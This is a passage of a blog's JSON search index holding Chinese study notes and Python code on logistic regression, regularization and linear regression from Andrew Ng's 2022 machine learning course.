这里采用sigmoid作为model，公式如下： $g(z)=\\frac{1}{1+e^{-z}}$ model： $f(\\vec{w},b)(\\vec{x}) = g(\\vec{w}\\cdot{\\vec{x}}+b) = \\frac{1}{1+e^{-(\\vec{w}\\cdot{\\vec{x}}+b)}}$ ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/:1:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习-week3-逻辑回归(Logistic Regression)","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/"},{"categories":["AI"],"content":"逻辑回归的Loss Function 损失函数只是在单个数据集中 ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/:2:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习-week3-逻辑回归(Logistic Regression)","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/"},{"categories":["AI"],"content":"逻辑回归的Cost Function 需要对loss求和累加 比如： X_train = np.array([[0.5, 1.5], [1,1], [1.5, 0.5], [3, 0.5], [2, 2], [1, 2.5]]) #(m,n) y_train = np.array([0, 0, 0, 1, 1, 1]) #(m,) def compute_cost_logistic(X, y, w, b): \"\"\" Computes cost Args: X (ndarray (m,n)): Data, m examples with n features y (ndarray (m,)) : target values w (ndarray (n,)) : model parameters b (scalar) : model parameter Returns: cost (scalar): cost \"\"\" m = X.shape[0] cost = 0.0 for i in range(m): z_i = np.dot(X[i],w) + b f_wb_i = sigmoid(z_i) cost += -y[i]*np.log(f_wb_i) - (1-y[i])*np.log(1-f_wb_i) cost = cost / m return cost w_tmp = np.array([1,1]) b_tmp = -3 print(compute_cost_logistic(X_train, y_train, w_tmp, b_tmp)) ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/:3:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习-week3-逻辑回归(Logistic Regression)","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/"},{"categories":["AI"],"content":"逻辑回归的Gradient Descent 跟线性回归一样，只不过f的内容有些区别 $$\\begin{align*} \u0026\\text{repeat until convergence:} ; \\lbrace \\ \u0026 ; ; ;w_j = w_j - \\alpha \\frac{\\partial J(\\mathbf{w},b)}{\\partial w_j} \\tag{1} ; \u0026 \\text{for j := 0..n-1} \\ \u0026 ; ; ; ; ;b = b - \\alpha \\frac{\\partial J(\\mathbf{w},b)}{\\partial b} \\ \u0026\\rbrace \\end{align*}$$ Where each iteration performs simultaneous updates on $w_j$ for all $j$, where $$\\begin{align*} \\frac{\\partial J(\\mathbf{w},b)}{\\partial w_j} \u0026= \\frac{1}{m} \\sum\\limits_{i = 0}^{m-1} (f_{\\mathbf{w},b}(\\mathbf{x}^{(i)}) - y^{(i)})x_{j}^{(i)} \\tag{2} \\ \\frac{\\partial J(\\mathbf{w},b)}{\\partial b} \u0026= \\frac{1}{m} \\sum\\limits_{i = 0}^{m-1} (f_{\\mathbf{w},b}(\\mathbf{x}^{(i)}) - y^{(i)}) \\tag{3} \\end{align*}$$ 计算梯度： def compute_gradient_logistic(X, y, w, b): \"\"\" Computes the gradient for linear regression Args: X (ndarray (m,n): Data, m examples with n features y (ndarray (m,)): target values w (ndarray (n,)): model parameters b (scalar) : model parameter Returns dj_dw (ndarray (n,)): The gradient of the cost w.r.t. the parameters w. dj_db (scalar) : The gradient of the cost w.r.t. the parameter b. \"\"\" m,n = X.shape dj_dw = np.zeros((n,)) #(n,) dj_db = 0. for i in range(m): f_wb_i = sigmoid(np.dot(X[i],w) + b) #(n,)(n,)=scalar err_i = f_wb_i - y[i] #scalar for j in range(n): dj_dw[j] = dj_dw[j] + err_i * X[i,j] #scalar dj_db = dj_db + err_i dj_dw = dj_dw/m #(n,) dj_db = dj_db/m #scalar return dj_db, dj_dw X_tmp = np.array([[0.5, 1.5], [1,1], [1.5, 0.5], [3, 0.5], [2, 2], [1, 2.5]]) y_tmp = np.array([0, 0, 0, 1, 1, 1]) w_tmp = np.array([2.,3.]) b_tmp = 1. dj_db_tmp, dj_dw_tmp = compute_gradient_logistic(X_tmp, y_tmp, w_tmp, b_tmp) print(f\"dj_db: {dj_db_tmp}\" ) print(f\"dj_dw: {dj_dw_tmp.tolist()}\" ) 梯度下降： def gradient_descent(X, y, w_in, b_in, alpha, num_iters): \"\"\" Performs batch gradient descent Args: X (ndarray (m,n) : Data, m examples with n features y (ndarray (m,)) : target values w_in (ndarray (n,)): Initial values of model parameters b_in (scalar) : Initial values of model parameter alpha (float) : Learning rate num_iters (scalar) : number of iterations to run gradient descent Returns: w (ndarray (n,)) : Updated values of parameters b (scalar) : Updated value of parameter \"\"\" # An array to store cost J and w's at each iteration primarily for graphing later J_history = [] w = copy.deepcopy(w_in) #avoid modifying global w within function b = b_in for i in range(num_iters): # Calculate the gradient and update the parameters dj_db, dj_dw = compute_gradient_logistic(X, y, w, b) # Update Parameters using w, b, alpha and gradient w = w - alpha * dj_dw b = b - alpha * dj_db # Save cost J at each iteration if i\u003c100000: # prevent resource exhaustion J_history.append( compute_cost_logistic(X, y, w, b) ) # Print cost every at intervals 10 times or as many iterations if \u003c 10 if i% math.ceil(num_iters / 10) == 0: print(f\"Iteration {i:4d}: Cost {J_history[-1]} \") return w, b, J_history #return final w,b and J history for graphing w_tmp = np.zeros_like(X_train[0]) b_tmp = 0. alph = 0.1 iters = 10000 w_out, b_out, _ = gradient_descent(X_train, y_train, w_tmp, b_tmp, alph, iters) print(f\"\\nupdated parameters: w:{w_out}, b:{b_out}\") # 画图像 fig,ax = plt.subplots(1,1,figsize=(5,4)) # plot the probability plt_prob(ax, w_out, b_out) # Plot the original data ax.set_ylabel(r'$x_1$') ax.set_xlabel(r'$x_0$') ax.axis([0, 4, 0, 3.5]) plot_data(X_train,y_train,ax) # Plot the decision boundary x0 = -b_out/w_out[1] x1 = -b_out/w_out[0] ax.plot([0,x0],[x1,0], c=dlc[\"dlblue\"], lw=1) plt.show() ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/:4:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习-week3-逻辑回归(Logistic Regression)","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/"},{"categories":["AI"],"content":"用Scikit-Learn实现逻辑回归 import numpy as np from sklearn.linear_model import LogisticRegression X = np.array([[0.5, 1.5], [1,1], [1.5, 0.5], [3, 0.5], [2, 2], [1, 2.5]]) y = np.array([0, 0, 0, 1, 1, 1]) # 拟合模型 lr_model = LogisticRegression() lr_model.fit(X, y) # 进行预测 y_pred = lr_model.predict(X) print(\"Prediction on training set:\", y_pred) # 计算精度 print(\"Accuracy on training set:\", lr_model.score(X, y)) ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/:5:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习-week3-逻辑回归(Logistic Regression)","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/"},{"categories":["AI"],"content":"Overfitting 高方差(high variance) 过拟合$h(\\theta)$的多项式过于复杂以致于拟合了所有的数据 解决办法： 收集更多训练数据 使用更少特征 交叉验证 早停 正则化(正则化可用于降低模型的复杂性。这是通过惩罚损失函数完成的，可通过 L1 和 L2 两种方式完成) Dropout(Dropout 是一种正则化方法，用于随机禁用神经网络单元。它可以在任何隐藏层或输入层上实现，但不能在输出层上实现。该方法可以免除对其他神经元的依赖，进而使网络学习独立的相关性。该方法能够降低网络的密度) 这里以正则化说了： 正则化可以防止过拟合，进而增强泛化能力 采取的方法是在原来平方差误差的基础上添加正则项(一般选择正则化w而非b)： 线性回归： def compute_cost_linear_reg(X, y, w, b, lambda_ = 1): \"\"\" Computes the cost over all examples Args: X (ndarray (m,n): Data, m examples with n features y (ndarray (m,)): target values w (ndarray (n,)): model parameters b (scalar) : model parameter lambda_ (scalar): Controls amount of regularization Returns: total_cost (scalar): cost \"\"\" m = X.shape[0] n = len(w) cost = 0. for i in range(m): f_wb_i = np.dot(X[i], w) + b #(n,)(n,)=scalar, see np.dot cost = cost + (f_wb_i - y[i])**2 #scalar cost = cost / (2 * m) #scalar reg_cost = 0 for j in range(n): reg_cost += (w[j]**2) #scalar reg_cost = (lambda_/(2*m)) * reg_cost #scalar total_cost = cost + reg_cost #scalar return total_cost #scalar np.random.seed(1) X_tmp = np.random.rand(5,6) y_tmp = np.array([0,1,0,1,0]) w_tmp = np.random.rand(X_tmp.shape[1]).reshape(-1,)-0.5 b_tmp = 0.5 lambda_tmp = 0.7 cost_tmp = compute_cost_linear_reg(X_tmp, y_tmp, w_tmp, b_tmp, lambda_tmp) print(\"Regularized cost:\", cost_tmp) 逻辑回归添加正则项： def compute_cost_logistic_reg(X, y, w, b, lambda_ = 1): \"\"\" Computes the cost over all examples Args: Args: X (ndarray (m,n): Data, m examples with n features y (ndarray (m,)): target values w (ndarray (n,)): model parameters b (scalar) : model parameter lambda_ (scalar): Controls amount of regularization Returns: total_cost (scalar): cost \"\"\" m,n = X.shape cost = 0. for i in range(m): z_i = np.dot(X[i], w) + b #(n,)(n,)=scalar, see np.dot f_wb_i = sigmoid(z_i) #scalar cost += -y[i]*np.log(f_wb_i) - (1-y[i])*np.log(1-f_wb_i) #scalar cost = cost/m #scalar reg_cost = 0 for j in range(n): reg_cost += (w[j]**2) #scalar reg_cost = (lambda_/(2*m)) * reg_cost #scalar total_cost = cost + reg_cost #scalar return total_cost #scalar np.random.seed(1) X_tmp = np.random.rand(5,6) y_tmp = np.array([0,1,0,1,0]) w_tmp = np.random.rand(X_tmp.shape[1]).reshape(-1,)-0.5 b_tmp = 0.5 lambda_tmp = 0.7 cost_tmp = compute_cost_logistic_reg(X_tmp, y_tmp, w_tmp, b_tmp, lambda_tmp) print(\"Regularized cost:\", cost_tmp) 梯度下降中添加正则项： def compute_gradient_linear_reg(X, y, w, b, lambda_): \"\"\" Computes the gradient for linear regression Args: X (ndarray (m,n): Data, m examples with n features y (ndarray (m,)): target values w (ndarray (n,)): model parameters b (scalar) : model parameter lambda_ (scalar): Controls amount of regularization Returns: dj_dw (ndarray (n,)): The gradient of the cost w.r.t. the parameters w. dj_db (scalar): The gradient of the cost w.r.t. the parameter b. \"\"\" m,n = X.shape #(number of examples, number of features) dj_dw = np.zeros((n,)) dj_db = 0. for i in range(m): err = (np.dot(X[i], w) + b) - y[i] for j in range(n): dj_dw[j] = dj_dw[j] + err * X[i, j] dj_db = dj_db + err dj_dw = dj_dw / m dj_db = dj_db / m for j in range(n): dj_dw[j] = dj_dw[j] + (lambda_/m) * w[j] return dj_db, dj_dw np.random.seed(1) X_tmp = np.random.rand(5,3) y_tmp = np.array([0,1,0,1,0]) w_tmp = np.random.rand(X_tmp.shape[1]) b_tmp = 0.5 lambda_tmp = 0.7 dj_db_tmp, dj_dw_tmp = compute_gradient_linear_reg(X_tmp, y_tmp, w_tmp, b_tmp, lambda_tmp) print(f\"dj_db: {dj_db_tmp}\", ) print(f\"Regularized dj_dw:\\n {dj_dw_tmp.tolist()}\", ) def compute_gradient_logistic_reg(X, y, w, b, lambda_): \"\"\" Computes the gradient for linear regression Args: X (ndarray (m,n): Data, m examples with n features y (ndarray (m,)): target values w (ndarray (n,)): model parameters b (scalar) : model parameter lambda_ (scalar): Controls amount of regularization Returns dj_dw (ndarray Shape (n,)): The gradient of the cost w.r.t. the parameters w. dj_db (scalar) : The gradient of the cost w.r.t. the parameter b. \"\"\" m,n = X.shape dj_dw = np.zeros((n,)) #(n,) dj_db = 0.0 #scalar for i in range(m): f_wb_i = sig","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/:6:0","tags":["吴恩达2022年机器学习","逻辑回归","Logistic Regression"],"title":"吴恩达2022新版机器学习-week3-逻辑回归(Logistic Regression)","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-week3-%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92-logistic-regression/"},{"categories":["AI"],"content":" 个人笔记，还有很多不懂的地方，如有错误欢迎指出 ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/:0:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-多变量回归预测房价","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/"},{"categories":["AI"],"content":"问题描述 多变量回归预测房价 训练样本在house.txt中，包含特征：size(sqrt)’,‘bedrooms’,‘floors’,‘age’和’price’ ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/:1:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-多变量回归预测房价","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/"},{"categories":["AI"],"content":"使用传统方法实验 多变量回归模型： def predict(x, w, b): \"\"\" single predict using linear regression Args: x (ndarray): Shape (n,) example with multiple features w (ndarray): Shape (n,) model parameters b (scalar): model parameter Returns: p (scalar): prediction \"\"\" p = np.dot(x, w) + b return p # get a row from our training data x_vec = X_train[0,:] print(f\"x_vec shape {x_vec.shape}, x_vec value: {x_vec}\") # make a prediction f_wb = predict(x_vec,w_init, b_init) print(f\"f_wb shape {f_wb.shape}, prediction: {f_wb}\") 计算多变量的代价： def compute_cost(X, y, w, b): \"\"\" compute cost Args: X (ndarray (m,n)): Data, m examples with n features y (ndarray (m,)) : target values w (ndarray (n,)) : model parameters b (scalar) : model parameter Returns: cost (scalar): cost \"\"\" m = X.shape[0] cost = 0.0 for i in range(m): f_wb_i = np.dot(X[i], w) + b # (n,)(n,) = scalar (see np.dot) cost = cost + (f_wb_i - y[i]) ** 2 # scalar cost = cost / (2 * m) # scalar return cost cost = compute_cost(X_train, y_train, w_init, b_init) print(f'Cost at optimal w : {cost}') 计算梯度： def compute_gradient(X, y, w, b): \"\"\" Computes the gradient for linear regression Args: X (ndarray (m,n)): Data, m examples with n features y (ndarray (m,)) : target values w (ndarray (n,)) : model parameters b (scalar) : model parameter Returns: dj_dw (ndarray (n,)): The gradient of the cost w.r.t. the parameters w. dj_db (scalar): The gradient of the cost w.r.t. the parameter b. \"\"\" m,n = X.shape #(number of examples, number of features) dj_dw = np.zeros((n,)) dj_db = 0. for i in range(m): err = (np.dot(X[i], w) + b) - y[i] for j in range(n): dj_dw[j] = dj_dw[j] + err * X[i, j] dj_db = dj_db + err dj_dw = dj_dw / m dj_db = dj_db / m return dj_db, dj_dw 进行梯度下降： def gradient_descent(X, y, w_in, b_in, cost_function, gradient_function, alpha, num_iters): \"\"\" Performs batch gradient descent to learn theta. Updates theta by taking num_iters gradient steps with learning rate alpha Args: X (ndarray (m,n)) : Data, m examples with n features y (ndarray (m,)) : target values w_in (ndarray (n,)) : initial model parameters b_in (scalar) : initial model parameter cost_function : function to compute cost gradient_function : function to compute the gradient alpha (float) : Learning rate num_iters (int) : number of iterations to run gradient descent Returns: w (ndarray (n,)) : Updated values of parameters b (scalar) : Updated value of parameter \"\"\" # An array to store cost J and w's at each iteration primarily for graphing later J_history = [] w = copy.deepcopy(w_in) #avoid modifying global w within function b = b_in for i in range(num_iters): # Calculate the gradient and update the parameters dj_db,dj_dw = gradient_function(X, y, w, b) ##None # Update Parameters using w, b, alpha and gradient w = w - alpha * dj_dw ##None b = b - alpha * dj_db ##None # Save cost J at each iteration if i\u003c100000: # prevent resource exhaustion J_history.append( cost_function(X, y, w, b)) # Print cost every at intervals 10 times or as many iterations if \u003c 10 if i% math.ceil(num_iters / 10) == 0: print(f\"Iteration {i:4d}: Cost {J_history[-1]:8.2f} \") return w, b, J_history #return final w,b and J history for graphing # initialize parameters initial_w = np.zeros_like(w_init) initial_b = 0. # some gradient descent settings iterations = 1000 alpha = 5.0e-7 # run gradient descent w_final, b_final, J_hist = gradient_descent(X_train, y_train, initial_w, initial_b, compute_cost, compute_gradient, alpha, iterations) print(f\"b,w found by gradient descent: {b_final:0.2f},{w_final} \") m,_ = X_train.shape for i in range(m): print(f\"prediction: {np.dot(X_train[i], w_final) + b_final:0.2f}, target value: {y_train[i]}\") m = X_train.shape[0] yp = np.zeros(m) for i in range(m): # print(f\"prediction: {np.dot(X_train[i], w_final) + b_final:0.2f}, target value: {y_train[i]}\") yp[i] = np.dot(X_train[i], w_final) + b_final # # plot predictions and targets versus original features fig, ax = plt.subplots(1, 4, figsize=(12, 3), sharey=True) for i in range(len(ax)): a","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/:2:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-多变量回归预测房价","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/"},{"categories":["AI"],"content":"使用Scikit-Learn \"\"\" 多变量回归预测房价 训练样本在house.txt中，包含特征：size(sqrt)','bedrooms','floors','age'和'price' \"\"\" import numpy as np import matplotlib.pyplot as plt np.set_printoptions(precision=2) from sklearn.linear_model import LinearRegression, SGDRegressor from sklearn.preprocessing import StandardScaler def main(): # 加载数据 data = np.loadtxt(\"./data/houses.txt\", delimiter=',', skiprows=1) x_train, y_train = data[:, :4], data[:, 4] x_features = ['size(sqft)', 'bedrooms', 'floors', 'age'] # 特征缩放/正则化 scaler = StandardScaler() x_norm = scaler.fit_transform(x_train) print(f\"Peak to Peak range by column in Raw X:{np.ptp(x_train, axis=0)}\") print(f\"Peak to Peak range by column in Normalized X:{np.ptp(x_norm, axis=0)}\") # 创建回归模型并fit(这里利用梯度下降进行拟合) sgdr = SGDRegressor(max_iter=1000) sgdr.fit(x_norm, y_train) print(sgdr) print(f\"number of iterations completed: {sgdr.n_iter_}, number of weight updates: {sgdr.t_}\") # 查看参数 b_norm = sgdr.intercept_ w_norm = sgdr.coef_ print(f\"model parameters: w: {w_norm}, b:{b_norm}\") print(f\"model parameters from previous lab: w: [110.56 -21.27 -32.71 -37.97], b: 363.16\") # 进行预测 # make a prediction using sgdr.predict() y_pred_sgd = sgdr.predict(x_norm) # make a prediction using w,b. y_pred = np.dot(x_norm, w_norm) + b_norm print(f\"prediction using np.dot() and sgdr.predict match: {(y_pred == y_pred_sgd).all()}\") print(f\"Prediction on training set:\\n{y_pred[:4]}\") print(f\"Target values \\n{y_train[:4]}\") # 绘制结果图像 # plot predictions and targets vs original features dlorange = '#FF9300' fig, ax = plt.subplots(1, 4, figsize=(12, 3), sharey=True) for i in range(len(ax)): ax[i].scatter(x_train[:, i], y_train, label='target') ax[i].set_xlabel(x_features[i]) ax[i].scatter(x_train[:, i], y_pred, color=dlorange, label='predict') ax[0].set_ylabel(\"Price\") ax[0].legend() fig.suptitle(\"target versus prediction using z-score normalized model\") plt.show() if __name__ == '__main__': main() 好菜自己…自己还是不清晰 ","date":"2022-07-11","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/:3:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-多变量回归预测房价","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E5%A4%9A%E5%8F%98%E9%87%8F%E5%9B%9E%E5%BD%92%E9%A2%84%E6%B5%8B%E6%88%BF%E4%BB%B7/"},{"categories":["AI"],"content":"题目 **目标：**In this lab, you will implement linear regression with one variable to predict profits for a restaurant franchise. 问题陈述： 假设你是餐厅CEO，想要在不同城市开分店 想要把业务拓展到更高利润的城市 连锁店已经在各个城市开设了餐厅，并且你拥有来自城市的利润和人口数据 你还有餐厅候选城市的数据 课程资源：https://github.com/kaieye/2022-Machine-Learning-Specialization#%E8%AF%BE%E7%A8%8B%E5%A4%A7%E7%BA%B2 数据在data目录下 有些方法已经定义好，我们只需调用即可 ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:1:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"实验 ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:0","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"导包 # 导包 import numpy as np import matplotlib.pyplot as plt import copy import math from utils import * from public_tests import * ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:1","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"加载数据 有些方法在util.py已经定义好，我们只需调用即可 # 加载数据 x_train是城市人口(人口代表其值*10000)，y_train代表利润(有正负,值*$10000) x_train, y_train = load_data() ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:2","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"查看数据 def cat_data(): \"\"\" 查看数据维度和形式等 \"\"\" print(\"x_data数据类型：\", type(x_train)) # \u003cclass 'numpy.ndarray'\u003e print(\"y_data数据类型：\", type(y_train)) # \u003cclass 'numpy.ndarray'\u003e # 查看数据的维度 print(\"x_data的shape:\", x_train.shape) print(\"x_data的维度:\", x_train.ndim) print(\"数据集个数(m):\", len(x_train)) # 可视化数据 plt.scatter(x_train, y_train, marker='x', c='r') plt.title(\"Profits vs. Population per city\") plt.ylabel('Profit in $10000') plt.xlabel('Population of City in 10000') plt.show() # 我们的目标就是建立线性回归model来fit这个data ","date":"2022-07-10","objectID":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/:2:3","tags":["吴恩达新版机器学习","线性回归作业","深度学习基础"],"title":"吴恩达2022新版机器学习课后题-课程1Week2-线性回归","uri":"/%E5%90%B4%E6%81%A9%E8%BE%BE2022%E6%96%B0%E7%89%88%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E9%A2%98-%E8%AF%BE%E7%A8%8B1week2-%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"},{"categories":["AI"],"content":"回顾线性回归模型 我们预测的餐厅利润就是$f_{w,b}(x^{(i)})$的值 